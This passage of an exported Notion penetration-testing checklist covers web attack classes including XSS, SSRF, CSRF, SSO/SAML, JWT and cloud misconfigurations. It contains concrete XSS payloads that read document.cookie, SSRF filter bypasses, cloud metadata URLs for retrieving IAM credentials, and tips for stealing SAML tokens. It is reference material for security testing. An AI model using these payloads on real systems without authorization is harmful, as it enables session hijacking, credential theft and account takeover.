Testing</strong></summary><div class="indented"><ul id="134b0a6a-b787-815f-b065-f98a20da6c55" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Try XSS using QuickXSS tool by theinfosecguy</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81cc-8e82-db29009c259b" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Upload file using &#x27;&quot;&gt;&lt;img src=x onerror=alert(document.domain)&gt;.txt</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81ef-a9fd-f0ecee0dc442" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">If script tags are banned, use &lt;h1&gt; and other HTML tags</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8194-8e64-f1917ea3d886" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">If output is reflected back inside the JavaScript as a value of any variable just use alert(1)</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-812c-9d28-f94bf2c55227" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">if &quot; are filtered then use this payload /&gt;&lt;img src=d onerror=confirm(/tushar/);&gt;</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-810e-ac00-e8fa159549ae" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Upload a JavaScript using Image file</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8181-ba64-ce817590dfa7" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Unusual way to execute your JS payload is to change method from POST to GET. It bypasses filters sometimes</span><div class="indented"></div></li></ul><details id="134b0a6a-b787-81bb-93ca-c329e0791dc3" open="" class="toggle" dir="auto"><summary>Tag attribute value</summary><div class="indented"><ul id="134b0a6a-b787-8101-9308-df3dd53833d2" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Input landed -&lt;input type=”text” name=”state” value=”INPUT_FROM_ USER”&gt;</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81dc-b0c7-cc38be507917" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Payload to be inserted -“ onfocus=”alert(document.cookie)&quot;</span><div class="indented"></div></li></ul></div></details><ul id="134b0a6a-b787-818e-824f-db2e1c716460" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Syntax Encoding payload “%3cscript%3ealert(document.cookie)%3c/script%3e&quot;</span><div class="indented"></div></li></ul><details id="134b0a6a-b787-814a-8b26-e0ea449a7c04" open="" class="toggle" dir="auto"><summary>XSS filter evasion</summary><div class="indented"><ul id="134b0a6a-b787-81ac-a25d-da751cc4c67a" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">&lt; and &gt; can be replace with html entities &amp;lt; and &amp;gt;</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81d6-9300-e708470d5d07" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">You can try an XSS polyglot.Eg:-javascript:/<em>-&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt;&lt;svg/onload=&#x27;+/&quot;/+/onmouseover=1/+/[</em>/[]/+alert(1)//&#x27;&gt;</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-813e-8800-f645f64f0be7" open="" class="toggle" dir="auto"><summary>XSS Firewall Bypass</summary><div class="indented"></div></details></div></details><details id="134b0a6a-b787-808d-8083-f73d89642609" open="" class="toggle" dir="auto"><summary><strong>Server-side request forgery (SSRF)</strong></summary><div class="indented"><details id="134b0a6a-b787-81f8-bc02-f036bfd4e58b" open="" class="toggle" dir="auto"><summary>Common injection parameters</summary><div class="indented"><pre id="134b0a6a-b787-81ef-a62e-e011e6bec141" class="code code-wrap" data-notion-code-syntax="markup"><code class="language-markup" style="white-space:pre-wrap;word-break:break-all">&quot;access=&quot;, 
+&quot;admin=&quot;, 
+&quot;dbg=&quot;, 
+&quot;debug=&quot;, 
+&quot;edit=&quot;, 
+&quot;grant=&quot;, 
+&quot;test=&quot;, 
+&quot;alter=&quot;, 
+&quot;clone=&quot;, 
+&quot;create=&quot;, 
+&quot;delete=&quot;, 
+&quot;disable=&quot;, 
+&quot;enable=&quot;, 
+&quot;exec=&quot;, 
+&quot;execute=&quot;, 
+&quot;load=&quot;, 
+&quot;make=&quot;, 
+&quot;modify=&quot;, 
+&quot;rename=&quot;, 
+&quot;reset=&quot;, 
+&quot;shell=&quot;, 
+&quot;toggle=&quot;, 
+&quot;adm=&quot;, 
+&quot;root=&quot;, 
+&quot;cfg=&quot;,
+&quot;dest=&quot;, 
+&quot;redirect=&quot;, 
+&quot;uri=&quot;, 
+&quot;path=&quot;, 
+&quot;continue=&quot;, 
+&quot;url=&quot;, 
+&quot;window=&quot;, 
+&quot;next=&quot;, 
+&quot;data=&quot;, 
+&quot;reference=&quot;, 
+&quot;site=&quot;, 
+&quot;html=&quot;, 
+&quot;val=&quot;, 
+&quot;validate=&quot;, 
+&quot;domain=&quot;, 
+&quot;callback=&quot;, 
+&quot;return=&quot;, 
+&quot;page=&quot;, 
+&quot;feed=&quot;, 
+&quot;host=&quot;, 
+&quot;port=&quot;, 
+&quot;to=&quot;, 
+&quot;out=&quot;,
+&quot;view=&quot;, 
+&quot;dir=&quot;, 
+&quot;show=&quot;, 
+&quot;navigation=&quot;, 
+&quot;open=&quot;,
+&quot;file=&quot;,
+&quot;document=&quot;,
+&quot;folder=&quot;,
+&quot;pg=&quot;,
+&quot;php_path=&quot;,
+&quot;style=&quot;,
+&quot;doc=&quot;,
+&quot;img=&quot;,
+&quot;filename=&quot;</code></pre></div></details><details id="134b0a6a-b787-8152-9ae4-fe9b891864c9" open="" class="toggle" dir="auto"><summary>Finding hidden attack surface</summary><div class="indented"><ul id="134b0a6a-b787-81e7-aec1-fabf668dcaf0" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Partial URLs in requests</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-811a-8382-e906dcd746e7" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">URLs within data formats</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81ce-a7cc-d105d4bf106a" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">SSRF via the Referer header</span><div class="indented"></div></li></ul></div></details><ul id="134b0a6a-b787-814e-b1b0-c4ac4e63ccc0" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Try basic localhost payloads</span><div class="indented"></div></li></ul><details id="134b0a6a-b787-812c-9039-fddaad64d62e" open="" class="toggle" dir="auto"><summary>Bypassing filters</summary><div class="indented"><ul id="134b0a6a-b787-81e6-b702-d5a7f99e1484" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Bypass using HTTPS</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-815d-98bf-fefcbb4f5f10" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Bypass with [::]</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8191-9980-c4edbd781c49" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Bypass with a domain redirection</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8161-86cf-e615a3ddc697" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Bypass using a decimal IP location</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81e2-bb50-f79c22474065" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Bypass using IPv6/IPv4 Address Embedding</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81c2-9a3f-d1536d9be7db" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Bypass using malformed urls</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81b6-a1bf-c00b7a8fc35b" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Bypass using rare address(short-hand IP addresses by dropping the zeros)</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8134-9cfc-f6302354aa8f" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Bypass using enclosed alphanumerics</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-813b-aea3-c119f4ee4f6d" open="" class="toggle" dir="auto"><summary>Cloud Instances</summary><div class="indented"><details id="134b0a6a-b787-81da-b983-d22abb305c0d" open="" class="toggle" dir="auto"><summary>AWS</summary><div class="indented"><pre id="134b0a6a-b787-819a-8cc3-df59f4f879fb" class="code code-wrap" data-notion-code-syntax="markup"><code class="language-markup" style="white-space:pre-wrap;word-break:break-all">http://instance-data
+http://169.254.169.254
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
+http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
+http://169.254.169.254/latest/meta-data/ami-id
+http://169.254.169.254/latest/meta-data/reservation-id
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/public-keys/
+http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
+http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
+http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
+http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
+http://169.254.169.254/latest/dynamic/instance-identity/document</code></pre></div></details><details id="134b0a6a-b787-8154-a029-e62ac29d9ef2" open="" class="toggle" dir="auto"><summary>Google Cloud</summary><div class="indented"><pre id="134b0a6a-b787-813f-a68a-ed9cc679c4d6" class="code code-wrap" data-notion-code-syntax="markup"><code class="language-markup" style="white-space:pre-wrap;word-break:break-all">http://169.254.169.254/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/hostname
+http://metadata.google.internal/computeMetadata/v1/instance/id
+http://metadata.google.internal/computeMetadata/v1/project/project-id</code></pre></div></details><details id="134b0a6a-b787-8104-a9cb-c2644a34a4e9" open="" class="toggle" dir="auto"><summary>Digital Ocean</summary><div class="indented"><pre id="134b0a6a-b787-815f-bd01-e11e0cff3d1a" class="code code-wrap" data-notion-code-syntax="markup"><code class="language-markup" style="white-space:pre-wrap;word-break:break-all">curl http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1.json
+http://169.254.169.254/metadata/v1/ 
+http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1/user-data
+http://169.254.169.254/metadata/v1/hostname
+http://169.254.169.254/metadata/v1/region
+http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address</code></pre></div></details><details id="134b0a6a-b787-81c0-8a2e-e9c18f4c4db2" open="" class="toggle" dir="auto"><summary>Azure</summary><div class="indented"><pre id="134b0a6a-b787-8144-ab53-f76610342400" class="code code-wrap"><code style="white-space:pre-wrap;word-break:break-all">http://169.254.169.254/metadata/v1/maintenance
+http://169.254.169.254/metadata/instance?api-version=2017-04-02
+http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&amp;format=text</code></pre></div></details></div></details><ul id="134b0a6a-b787-819f-baf2-c375a511ffa9" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Bypassing via open redirection</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81c1-9e6f-f510dcf7e5e6" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Blind SSRF</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-801b-a9aa-f6c3bbb5504a" open="" class="toggle" dir="auto"><summary><strong>CSRF Testing</strong></summary><div class="indented"><details id="134b0a6a-b787-8167-b308-fccfa6e24d8f" open="" class="toggle" dir="auto"><summary>Application has Anti-CSRF token implemented</summary><div class="indented"><ul id="134b0a6a-b787-8119-bf0b-e74af683a9cf" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Removing the Anti-CSRF Token</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8172-a99f-ffb9773b4c6a" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Altering the Anti-CSRF Token</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8178-8d04-c7ff6543e77f" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Using the Attacker’s Anti-CSRF Token</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-812e-a947-c470d581acc9" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Spoofing the Anti-CSRF Token</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-815d-aa7f-c4d15a746cdc" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Using guessable Anti-CSRF Tokens</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8138-8c47-d686e00cfa9b" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Stealing Anti-CSRF Tokens</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-812c-ad57-cd7d61e9d971" open="" class="toggle" dir="auto"><summary>Application uses Double Submit Cookie</summary><div class="indented"><ul id="134b0a6a-b787-81c7-bff9-c8dc98592845" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check for session fixation on subdomains</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81f4-9726-c26cd9fd270a" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Man in the the middle attack</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-81c3-a437-cf3969eac851" open="" class="toggle" dir="auto"><summary>Application validates the Referrer or the Origin of the request received</summary><div class="indented"><ul id="134b0a6a-b787-81c6-834e-e8a8ea2e8414" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Restricting the CSRF POC from sending the Referrer header</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-814f-8d3b-fe9ba907bfc4" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Bypass the whitelisting/blacklisting mechanism used by the application</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-8178-83b5-ebb454aee5be" open="" class="toggle" dir="auto"><summary>Sending data in JSON/XML format</summary><div class="indented"><ul id="134b0a6a-b787-81cb-a026-de731b84771f" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">By using normal HTML Form1</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81ca-85d3-f3da4752b740" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">By using normal HTML Form2 (By Fetch Request)</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81ac-8d90-ff2b7b67be67" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">By using XMLHTTP Request/AJAX request</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8103-9383-ec22eeffdd2f" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">By using Flash file</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-81f3-8e20-d7b816711903" open="" class="toggle" dir="auto"><summary>Samesite Cookie attribute</summary><div class="indented"></div></details></div></details><details id="134b0a6a-b787-800f-80dc-e680744bce7b" open="" class="toggle" dir="auto"><summary><strong>SSO Vulnerabilities</strong></summary><div class="indented"><ul id="134b0a6a-b787-81f2-b97d-d81b50395f01" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">If internal.company.com Redirects You To SSO e.g. auth.company.com, Do FUZZ<br/>On Internal.company.com</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81e8-996a-d4e9172cf23d" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">If company.com/internal Redirects You To SSO e.g. Google login, Try To Insert<br/>public Before internal e.g. company.com/public/internal To Gain Access Internal</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81f5-8b72-d2b9ee36c4e3" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Try To Craft SAML Request With Token And Send It To The Server And Figure<br/>Out How Server Interact With This</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81db-bfe4-cba978f73b24" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">If There Is AssertionConsumerServiceURL In Token Request Try To Insert Your<br/>Domain e.g. http://me.com As Value To Steal The Token</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81ff-9912-d9d8633c99b5" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">If There Is AssertionConsumerServiceURL In Token Request Try To Do FUZZ<br/>On Value Of AssertionConsumerServiceURL If It Is Not Similar To Origin</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-810f-b61a-fe10fae3a892" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">If There Is Any UUID, Try To Change It To UUID Of Victim Attacker e.g. Email Of<br/>Internal Employee Or Admin Account etc</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8179-aa0f-f4d622b9283f" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Try To Figure Out If The Server Vulnerable To XML Signature Wrapping OR Not?</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8178-8227-f3afd116b5ae" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Try To Figure Out If The Server Checks The Identity Of The Signer OR Not?</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-817b-8fc9-f7d14b8b931c" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Try To Inject XXE Payloads At The Top Of The SAML Response</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81b6-8f07-d16c0ef845a6" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Try To Inject XSLT Payloads Into The Transforms Element As A Child<br/>Node Of The SAML Response</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-810b-9dc8-fb4e1413598d" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">If Victim Can Accept Tokens Issued By The Same Identity Provider That Services<br/>Attacker, So You Can Takeover Victim Account</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81a1-8842-ef54e9f728ba" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">While Testing SSO Try To search In Burp Suite About URLs In Cookie Header e.g.<br/>Host=IP; If There Is Try To Change IP To Your IP To Get SSRF</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-808b-9d3d-dbf740e95d08" open="" class="toggle" dir="auto"><summary><strong>Cross-origin resource sharing (CORS)</strong></summary><div class="indented"><ul id="134b0a6a-b787-8102-b241-dac681847ff4" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Errors parsing Origin headers</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8160-9418-c88ea267b78a" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Whitelisted null origin value</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-803b-b24f-fc2532167614" open="" class="toggle" dir="auto"><summary><strong>JWT Token Testing</strong></summary><div class="indented"><ul id="134b0a6a-b787-8111-9a67-c7d7bf2c9e0b" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Brute-forcing secret keys</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81c5-871f-c6229cfae47c" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Signing a new token with the “none” algorithm</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8114-87d4-c93d3259baf5" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Changing the signing algorithm of the token (for fuzzing purposes)</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8190-bbce-d17caf4fdff2" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Signing the asymmetrically-signed token to its symmetric algorithm match (when you have the original public key)</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81a6-8442-f7ccb9db5887" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">(CVE-2015-2951) The alg=none signature-bypass vulnerability</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-815c-b887-e904ab6df865" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">(CVE-2016-10555) The RS/HS256 public key mismatch vulnerability</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81b1-8c1a-f96fc342a036" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">(CVE-2018-0114) Key injection vulnerability</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81a4-9c44-f4372e13be3d" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">(CVE-2019-20933/CVE-2020-28637) Blank password vulnerability</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81a2-ac0c-fda80753cd7d" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">(CVE-2020-28042) Null signature vulnerability</span><div class="indented"></div></li></ul><p id="134b0a6a-b787-8146-817c-e8757ec63b3d" class="" dir="auto">Tool: <a href="https://github.com/ticarpi/jwt_tool">https://github.com/ticarpi/jwt_tool</a></p></div></details><details id="134b0a6a-b787-8052-a705-ecbfe00d90e8" open="" class="toggle" dir="auto"><summary><strong>Cloud Services</strong></summary><div class="indented"><details id="134b0a6a-b787-81e3-8dd6-deaae0dd5d1f" open="" class="toggle" dir="auto"><summary>AWS Cognito</summary><div class="indented"><ul id="134b0a6a-b787-81aa-9206-fa566d58d99a" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Unauthorized access to AWS services due to Liberal AWS Credentials</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-813a-8be2-ff7a31345dbf" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Authentication bypass due to enabled Signup API action</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8116-9c33-f587baf6c6e5" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Privilege escalation through writable user attributes</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81b3-ab20-eb536ecb1c19" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Updating email attribute before verification</span><div class="indented"></div></li></ul></div></details></div></details><details id="134b0a6a-b787-80bd-bfa6-f483d156f804" open="" class="toggle" dir="auto"><summary><strong>WebSocket Testing</strong></summary><div class="indented"><ul id="134b0a6a-b787-81f0-ba51-c906bf2b7128" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Intercepting and modifying WebSocket messages</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8125-9870-c3e3cafaf5ef" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Websockets MITM attempts</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8109-a5b0-de4641b7f2fb" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Testing secret header websocket</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-817b-940f-d336aa752a92" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Content stealing in websockets</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81cf-84e1-dbb625646be2" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Token authentication testing in websockets</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-8079-a8f5-f8b170d29b41" open="" class="toggle" dir="auto"><summary><strong>GraphQL Vulnerabilities Testing</strong></summary><div class="indented"><ul id="134b0a6a-b787-81da-b9af-cf8a921dc20e" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Inconsistent Authorization Checks</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81a6-a4f9-f9a05fe0f20b" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Missing Validation of Custom Scalars</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8185-bad2-ce645e6e1d85" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Failure to Appropriately Rate-limit</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8124-8cce-e0d77427d1d0" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Introspection Query Enabled/Disabled</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-803b-8996-cb96192db16d" open="" class="toggle" dir="auto"><summary><strong>WordPress Common Vulnerabilities</strong></summary><div class="indented"><ul id="134b0a6a-b787-8122-964a-c5c5d827dbba" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">XSPA in wordpress</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-811f-8a9b-caefdd62e46a" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Bruteforce in wp-login.php</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81a1-8fa5-e3f7c300410a" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Information disclosure wordpress username</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8149-86f4-f98037bac9ad" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Backup file wp-config exposed</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8139-be29-ff67c91d74cd" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Log files exposed</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-816c-b332-e2c7f1a24092" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Denial of Service via load-styles.php</span><div 